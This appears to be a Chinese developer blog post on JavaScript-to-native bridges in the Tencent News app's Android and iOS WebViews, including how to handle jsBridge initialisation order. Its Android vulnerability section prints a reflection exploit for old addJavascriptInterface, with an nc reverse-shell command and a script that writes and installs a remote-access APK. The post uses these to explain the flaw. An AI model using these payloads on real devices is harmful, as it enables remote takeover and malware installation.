---
layout: post
title: 在APP中实现js与native通信
categories:
- 前端
tags:
- native通信
- 新闻客户端
- jsbridge
---

在订制腾讯新闻客户端的汽车页卡时，有些页面是用HTML页面实现的。比如车系详情页，车型详情页。这类页面因为汽车运营的关系具有不定期更新的特点。比如车型降价，新车上市等。使用HTML页面之后，有些数据需要从客户端传递过来，也有一些数据需要从页面传递到客户端，也就是HTML与客户端之间通信的问题。

##Android平台
###Android调用JS
{% highlight java %}
WebView.loadUrl("javascript:onJsAndroid()");
{% endhighlight %}

###JS调用Android
{% highlight java %}
// Android java代码
mWebView.addJavascriptInterface(new Class(),"android");  

public class Class(){
  @JavascriptInterface
  public void methodOne(){

  }
} 

// js 代码
window.android.methodOne();
{% endhighlight %}

###弊端
在Android 4.2之前的版本中，通过addJavascriptInterface然后利用java的反射机制，可以回调java类中的内置静态变量。

首先，通过java可以反弹shell，这样可以读写Android文件系统。
{% highlight javascript %}
function execute(cmdArgs)
{
  return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]);
alert("ok3");
{% endhighlight %}

其次，可以对网页挂马，安装apk到手机中
{% highlight javascript %}
function execute(cmdArgs)
{
  return xxx.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
} 
 
var armBinary1 = "x50x4Bx03x04x14x00x08x00x08x00x51x8FxCAx40x00x00x00x00x00x00x00x00x00x00x00x00x13x00x04x00x72x65x73x2Fx6Cx61x79x6Fx75x74x2Fx6Dx61x69x6Ex2Ex78x6Dx6CxFExCAx00x00xADx52x31x6FxD3x40x18xFDx2Ex76xAEx86xC4x69x5Ax3Ax54xA2x12xA9xC4"
 
var armBinary2="x1BxB0x65x0AxADx23xC2x30x64xDFxEExA1x0DxA4xE8x3Fx61x80xEExBCxE1xE7x7Bx4Ax25x6Fx8Bx36x71xC3x80x81x58xDBxC9x8Fx53x9FxEEx8Ax45xAFx23x54x4AxCFx2Bx52xF2x33x84xBAx82x36xC4x0Dx08xAFxC2x61x8ExD8x7Bx0BxFCx88x4Ax25x24x8Cx22xFAx76x44x78x5Ex99x62x30x44x8DxDBx74x94"
 
var armBinary3="…"
var armBinary4="…"
// ……
var patharm = "/mnt/sdcard/Androrat.apk";
var a=execute(["/system/bin/sh","-c","echo -n +armBinary1+ > " + patharm]);

execute(["/system/bin/sh","-c","echo -n +armBinary2+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo  -n +armBinary3+ >> " + patharm]);
execute(["/system/bin/sh","-c","echo -n +armBinary4+ >> " + patharm]);
execute(["/system/bin/sh","-c","adb install /mnt/sdcard/Androrat.apk"]);

{% endhighlight %}
以上流程，可以将apk进行拆分，利用echo写入到文件系统中，然后利用adb进行安装。

在Android 4.2版本中，开始使用@JavascriptInterface，然后在java代码中验证js调用的每个参数，屏蔽攻击代码，可以防止攻击。

汽车垂直化方案
新闻客户端提供两种js调用native的方式

* url scheme方式
通过伪协议"jsbridge://get_with_json_data?json=params", native代码重写shouldOverrideUrlLoading来做相关接口的实现和白名单控制
{% highlight javascript %}
/**
 * webview代码中通过监听onLoadResource触发调用Java方法
 */
function resourceCall() {
  var paramsArray = S.call(arguments, 0);
  var img = new Image();
  img.onload = function() {
    img = null;
  };
  img.src = 'jsbridge://get_with_json_data?json=' + encodeURIComponent(arrayToJsonString(paramsArray));
}
{% endhighlight %}
* prompt方式
这种方式是通过native重写onJsPrompt，拦截webview中的window.prompt并且获取其中的参数，处理完成之后需要调用JsPromptResult的confirm方法。
{% highlight javascript %}
/**
 * 通过prompt调用Java对象方法
 */
function promptCall() {
  var paramsArray = S.call(arguments, 0);
  var jsonResult = prompt(arrayToJsonString(paramsArray));
  var re = JSON.parse(jsonResult);
  if (re.code != 200) {
    throw "call error, code:" + re.code + ", message:" + re.result;
  }
  return re.result;
}
{% endhighlight %}

更多Android下js调用native的方案见此：[【Android WebView】Js调用Native的四种方式](http://km.oa.com/group/18297/articles/show/217614)

将与native通信用到的接口挂载在window.XXX下，调用window.XXX.YYY就可以调用native的方法。

##iOS平台
###iOS调用JS
{% highlight objective-c %}
// stringByEvaluatingJavaScriptFromString可以将字符串当做js来执行，在全局变量中定义js方法之后，OC就可以调用
- (void)webViewDidFinishLoad:(UIWebView *)webView {  
  NSString *currentURL = [webView stringByEvaluatingJavaScriptFromString:@"document.location.href"];
}
{% endhighlight %}

###JS调用iOS
js调用iOS，用到了开源库[TGJSBridge](https://github.com/ohsc/TGJSBridge)。其基本原理是利用伪协议"jsbridge://PostNotificationWithId-"，在native代码shouldStartLoadWithRequest中捕获并解析请求，然后调用相关的native逻辑。使用流程如下。
{% highlight javascript %}
// js向native发送修改页面标题的通知
jsBridge.postNotification('setTitle', {
  title : data.value
});
{% endhighlight %}
{% highlight objective-c %}
// 初始化jsBridge
- (void)webViewDidFinishLoad:(UIWebView *)webView
{
    [super webViewDidFinishLoad:webView];
    NSString *jsBridgePath = [[NSBundle mainBundle] pathForResource:@"TGJSBridge" ofType:@"js"];
    NSString *jsBridge = [NSString stringWithContentsOfFile:jsBridgePath encoding:NSUTF8StringEncoding error:nil];
    [self.webView stringByEvaluatingJavaScriptFromString:jsBridge];
    
    [self.webView stringByEvaluatingJavaScriptFromString:@"window.onJsBridgeReady()"];
    
    [self showLoading:NO animated:YES];
}

// 响应js端发送的通知"setTitle",修改页面标题
- (void)jsBridge:(TGJSBridge *)bridge setTitleWithUserInfo:(NSDictionary *)userInfo fromWebView:(UIWebView *)webview
{
//    NSString *titleName = QNString([userInfo objectForKey:@"title"], _carSerialName);
    ((QNTitleView *)self.qn_navigationItem.titleView).text = QNString([userInfo objectForKey:@"title"], _carSerialName);
}
{% endhighlight %}

在js调用iOS时，有一个前提，就是native代码中需要首先完成jsBridge的初始化。TGJSBridge提供了一个jsBridgeReady的事件，js端监听jsBridgeReady事件并在事件处理函数中再向native发送通知。

但是有个问题，新闻客户端将TGJSBridge.js文件打包到了安装包中，web页面无需再引入此js文件。在处理像设置页面标题这种问题时，即页面加载完成之后就需要马上向native发送通知的情况，就会有问题。

* js端直接调用jsBridge.bind('jsBridgeReady')——jsBridge可能还未初始化，并不在window的context中。
* 将jsBridge初始化操作提前，放在webViewDidStartLoad——jsBridgeReady已经被触发，但是页面js端还没开始监听jsBridgeReady事件。

native与js的jsBridge初始化调用顺序相互依赖，需要处理好，才能解决像setTitle这种操作。

**新闻客户端汽车页卡车系详情页的解决方式**
{% highlight javascript %}
//提供给ios调用的方法
var mutex = false;
window.onJsBridgeReady = function(){
  if(mutex){
    return;
  }
  try{
    nanoEvtProxy.on('iosnews:settit', function(data){
      jsBridge.postNotification('setTitle', {
        title : data.value
      });
    });
    nanoEvtProxy.trigger('iosnews:ready');
  }catch(e){

  }
  mutex = true;
}

// iosnews:ready被触发之后，说明native已经完成jsBridge初始化工作。
// 然后再触发iosnews:settit事件，
// 而在上面的代码中iosnews:settit事件已经完成监听，可以向native发送通知。
nanoEvtProxy.on('iosnews:ready', function(e, data){
  nanoEvtProxy.trigger('iosnews:settit', data);  
});
{% endhighlight %}

{% highlight objective-c %}
- (void)webViewDidFinishLoad:(UIWebView *)webView
{
    [super webViewDidFinishLoad:webView];
    
    // jsBridge初始化代码
    
    // 页面加载完成之后调用页面中定义的onJsBridgeReady方法
    [self.webView stringByEvaluatingJavaScriptFromString:@"window.onJsBridgeReady()"];
    
}
{% endhighlight %}

以上流程中，各种事件的监听和触发确实比较绕。但是梳理下来，是可以保证页面标题能正常而且尽可能快的被设置的。

##参考
[WebView中接口隐患与手机挂马利用](http://drops.wooyun.org/papers/548)

[【Android WebView】Js调用Native的四种方式](http://km.oa.com/group/18297/articles/show/217614)

[WebView中JavaScript与Objective-C的交互](http://blog.csdn.net/perry_xiao/article/details/8027249)